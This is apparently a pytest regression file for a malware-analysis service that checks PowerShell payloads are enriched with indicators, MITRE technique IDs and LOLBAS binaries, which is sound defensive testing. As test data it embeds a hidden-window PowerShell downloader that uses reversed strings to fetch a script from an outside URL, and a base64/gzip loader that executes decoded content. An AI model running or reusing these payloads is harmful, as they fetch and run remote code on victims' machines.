"""Regression: /api/decode/smart + /api/decode/chain must enrich plain-text
PowerShell payloads with IOCs / MITRE / LOLBAS, including URLs hidden by
same-quote-paired `[1..0]` character-reverse obfuscation (Feb-2026 bug).

Symptom (pre-fix):
    User pasted a PowerShell one-liner containing quoted reversed URL
    fragments. The OUTPUT box echoed the input verbatim and the IOC /
    MITRE / LOLBAS panels were empty — no `http://my-zone.com/from.ps1`,
    no `T1105`, no `powershell.exe`.

Root cause: the smart endpoint scanned `output` only, never `input`, so
plaintext PS commands with no decode work skipped enrichment entirely.
The chain endpoint scanned `input + output` but never reversed quoted
literals, so the hidden URL stayed reversed.

Fix: both endpoints now scan `input + output` PLUS the reversed copies
of every same-quote-paired string literal in the input.
"""
import os
import pytest
import requests

BASE_URL = ""
with open("/app/frontend/.env") as f:
    for line in f:
        if line.startswith("REACT_APP_BACKEND_URL="):
            BASE_URL = line.split("=", 1)[1].strip().rstrip("/")
assert BASE_URL

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")


PAYLOAD_REVERSED_DOWNLOADER = (
    'powershell.exe -NonIn -NoProf -WindowStyle Hidden -Command '
    '"IEX (([string[]](\'1sp.morf/moc.enoz-ym//:ptth\','
    '\'(tneilCbeW.teN tcejbO-weN)\')[1..0] |% '
    '{$e=$_;$r=\'\';for($i=$e.Length-1;$i -ge 0;$i-- ){$r+=$e[$i]};$r})'
    ' -join \'.DownloadFile\')"'
)

PAYLOAD_GZIP_LOADER = (
    "powershell -nop -w hidden -c \"$b='H4sICG06mFwCA2NvZGUAc0vNKy7PL"
    "8pJUQQAlp9pDwwAAAA=';$m=New-Object IO.MemoryStream(,[Convert]::"
    "FromBase64String($b));$g=New-Object IO.Compression.GzipStream("
    "$m,[IO.Compression.CompressionMode]::Decompress);$r=New-Object "
    "IO.StreamReader($g);IEX $r.ReadToEnd();\""
)


@pytest.fixture(scope="module")
def auth():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
                      timeout=15)
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def test_smart_extracts_reversed_url_via_char_reverse_trick(auth):
    """The unreversed URL `http://my-zone.com/from.ps1` MUST appear in
    the IOC.urls list for the reversed-DL payload — proving the router
    reverses same-quote-paired literals before IOC extraction."""
    r = requests.post(f"{BASE_URL}/api/decode/smart", headers=auth,
                      json={"input": PAYLOAD_REVERSED_DOWNLOADER}, timeout=30)
    assert r.status_code == 200, r.text
    d = r.json()
    urls = (d.get("iocs") or {}).get("urls") or []
    assert any("my-zone.com" in u for u in urls), (
        f"reversed URL not recovered: {urls}"
    )


def test_smart_extracts_mitre_from_plaintext_powershell(auth):
    """Plain-text PowerShell payload → MITRE must contain at least
    T1059.001 (PowerShell) and T1105 (Ingress Tool Transfer for the
    DownloadFile call)."""
    r = requests.post(f"{BASE_URL}/api/decode/smart", headers=auth,
                      json={"input": PAYLOAD_REVERSED_DOWNLOADER}, timeout=30)
    d = r.json()
    ids = {m.get("id") for m in (d.get("mitre") or [])}
    assert "T1059.001" in ids, f"T1059.001 missing: {ids}"
    assert "T1105" in ids, f"T1105 missing: {ids}"


def test_smart_extracts_powershell_lolbin(auth):
    """LOLBAS panel must include powershell.exe on the reversed-DL
    payload — this was completely empty pre-fix."""
    r = requests.post(f"{BASE_URL}/api/decode/smart", headers=auth,
                      json={"input": PAYLOAD_REVERSED_DOWNLOADER}, timeout=30)
    d = r.json()
    binaries = {l.get("binary") for l in (d.get("lolbas") or [])}
    assert "powershell.exe" in binaries, f"powershell.exe missing: {binaries}"


def test_smart_extracts_mitre_from_gzip_loader_even_when_container_corrupt(auth):
    """Even when the inner gzip container is unrecoverable (CRC fail on
    the intentionally-truncated blob), the OUTER PowerShell script MUST
    still be classified with T1059.001 + T1140 (Deobfuscate/Decode)."""
    r = requests.post(f"{BASE_URL}/api/decode/smart", headers=auth,
                      json={"input": PAYLOAD_GZIP_LOADER}, timeout=30)
    d = r.json()
    ids = {m.get("id") for m in (d.get("mitre") or [])}
    assert "T1059.001" in ids, f"T1059.001 missing: {ids}"
    assert "T1140" in ids, f"T1140 missing: {ids}"
    binaries = {l.get("binary") for l in (d.get("lolbas") or [])}
    assert "powershell.exe" in binaries


def test_chain_extracts_reversed_url_across_two_stages(auth):
    """The chain endpoint must also apply the reversed-literal
    augmentation — aggregating both payloads yields a Malicious verdict
    and the recovered URL in `aggregate.iocs.urls`."""
    r = requests.post(
        f"{BASE_URL}/api/decode/chain", headers=auth,
        json={"stages": [{"input": PAYLOAD_REVERSED_DOWNLOADER},
                         {"input": PAYLOAD_GZIP_LOADER}]},
        timeout=45,
    )
    assert r.status_code == 200, r.text
    d = r.json()
    agg = d.get("aggregate") or {}
    urls = (agg.get("iocs") or {}).get("urls") or []
    verdict = (agg.get("risk") or {}).get("verdict")
    ids = {m.get("id") for m in (agg.get("mitre") or [])}
    assert any("my-zone.com" in u for u in urls), f"URL missing: {urls}"
    assert verdict == "Malicious", f"expected Malicious, got {verdict}"
    assert {"T1105", "T1140", "T1059.001"}.issubset(ids), (
        f"MITRE incomplete: {ids}"
    )


def test_regex_does_not_cross_quote_types(auth):
    """Guard: an input mixing `"` and `'` quotes must NOT produce
    reversed IOCs from cross-quote fragments (regression against the
    original single-quote bug that leaked PowerShell syntax words as
    domains)."""
    payload = (
        'echo "opening" \'closing\' "another string" \'and-another\''
    )
    r = requests.post(f"{BASE_URL}/api/decode/smart", headers=auth,
                      json={"input": payload}, timeout=15)
    d = r.json()
    # No same-quote pair produces a URL-like domain, so no domains should
    # be extracted from the reversed literals.
    urls = (d.get("iocs") or {}).get("urls") or []
    assert urls == [], f"unexpected URLs: {urls}"
